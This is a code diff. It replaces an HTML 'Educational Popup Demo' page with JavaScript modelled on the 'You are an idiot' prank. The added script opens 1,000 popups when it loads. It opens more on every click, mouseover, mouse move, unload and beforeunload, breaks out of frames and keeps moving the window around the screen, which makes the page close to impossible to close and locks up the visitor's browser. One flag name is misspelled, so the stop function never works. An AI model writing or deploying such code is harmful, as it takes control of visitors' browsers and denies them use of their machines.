@@ -1,44 +1,72 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <title>Popup Demo</title>
-  <style>
-    body {
-      text-align: center;
-      font-family: sans-serif;
-      margin-top: 50px;
-    }
-    #message {
-      font-size: 2em;
-      color: red;
-    }
-  </style>
-</head>
-<body onload="init();">
-  <p id="message">Educational Popup Demo</p>
-  <script>
-    let popupInterval;
-    let popupCount = 0;
-    const maxPopups = 100000; // Limit for safety
-
-    function openPopup() {
-      const width = Math.floor(350 * 0.7);  // 30% smaller
-      const height = Math.floor(370 * 0.7);
-      window.open(
-        "about:blank",
-        "_blank",
-        `width=${width},height=${height},menubar=no,status=no,toolbar=no,resizable=no`
-      );
-      popupCount++;
-      if (popupCount >= maxPopups) {
-        clearInterval(popupInterval);
-      }
-    }
-
-    function init() {
-      popupInterval = setInterval(openPopup, 500); // One popup every second
-    }
-  </script>
-</body>
-</html>
-
+if (top.location != location) {
+  top.location.href = location.href;
+}
+for (var i = 0; i < 1000; i++) {
+    reopen();
+  }
+function reopen() {
+  window.open(
+    "popup.html",
+    "",
+    "blankmenubar=no,status=no,toolbar=noresizable=no,width=150,height=170,titlebar=no,alwaysRaised=yes"
+  );
+}
+function spam() {
+  for (var i = 0; i < 1000; i++) {
+    reopen();
+  }
+  return "You are an idiot!";
+}
+function init() {
+  document.body.onclick = reopen;
+  document.body.onmouseover = spam;
+  document.body.onmousemove = reopen;
+  window.onunload = spam;
+  window.onbeforeunload = spam;
+  playBall();
+  if (bookmark) {
+    bookmark();
+  }
+  reopen();
+}
+var xOff = 5,
+  yOff = 5,
+  xPos = 400,
+  yPos = -100,
+  flagRun = true;
+function newXlt() {
+  xOff = Math.ceil(0 - 6 * Math.random()) * 5 - 10;
+  window.focus();
+}
+function newXrt() {
+  xOff = Math.ceil(7 * Math.random()) * 5 - 10;
+}
+function newYup() {
+  yOff = Math.ceil(0 - 6 * Math.random()) * 5 - 10;
+}
+function newYdn() {
+  yOff = Math.ceil(7 * Math.random()) * 5 - 10;
+}
+function fOff() {
+  flagrun = false;
+}
+function playBall() {
+  xPos += xOff;
+  yPos += yOff;
+  if (xPos > screen.width - 175) {
+    newXlt();
+  }
+  if (xPos < 0) {
+    newXrt();
+  }
+  if (yPos > screen.height - 100) {
+    newYup();
+  }
+  if (yPos < 0) {
+    newYdn();
+  }
+  if (flagRun) {
+    window.moveTo(xPos, yPos);
+    setTimeout(playBall, 1);
+  }
+}
